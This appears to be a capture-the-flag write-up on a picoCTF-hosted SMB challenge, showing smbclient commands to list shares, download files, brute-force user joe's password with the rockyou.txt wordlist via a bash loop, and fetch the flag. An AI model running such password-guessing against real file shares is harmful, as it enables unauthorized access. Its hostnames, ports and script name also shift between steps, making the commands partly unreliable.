---
title: Printer Shares 2
date: 2023-03-09 10:00:00 -0400
categories: [Write Ups, MasterCard CTF 2026, General Skills]
tags: [MasterCard CTF, General, SMB]     # TAG names should always be lowercase
---

1. List shares from the server 

```
smbclient -L green-hill.picoctf.net -p 63738 
```

We have two shares: `shares` and `secure-shares`


2. Connect to the share's share

```
smbclient //mysterious-sea.picoctf.net/shares -p 53261 
```


3. List the files

`ls`

Download the three files `content.txt`, `kafka.txt` and `notification.txt`

```
get content.txt content.txt 
get kafka.txt kafka.txt
get notification.txt notification.txt
```

Then I checked the files. In notification.txt, we have the following:

```
Hi Joe,

We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team

```

I tried to log-in to the secure-shares share, but got NT_STATUS_ACCESS_DENIED

Hints:

- can you find a potential user? What is the username? **joe** is a potential user
- the wordlist, rockyou.txt, is pretty common for password cracking

4. Get the [rockyou.txt dataset](https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt/data) 

5. Created a simple bash script to read each password line and run:


```
smbclient //mysterious-sea.picoctf.net/shares -p 53261 -U joe%password
```

to run it

```
chmod +x script.sh
./script
```

and it found "**popcorn**"as the password

6. Log into the smb 

```
smbclient //mysterious-sea.picoctf.net/shares -p 53261 -U joe%popcorn
```

7. Get the file flag.txt

```
get flag.txt flag.txt
```
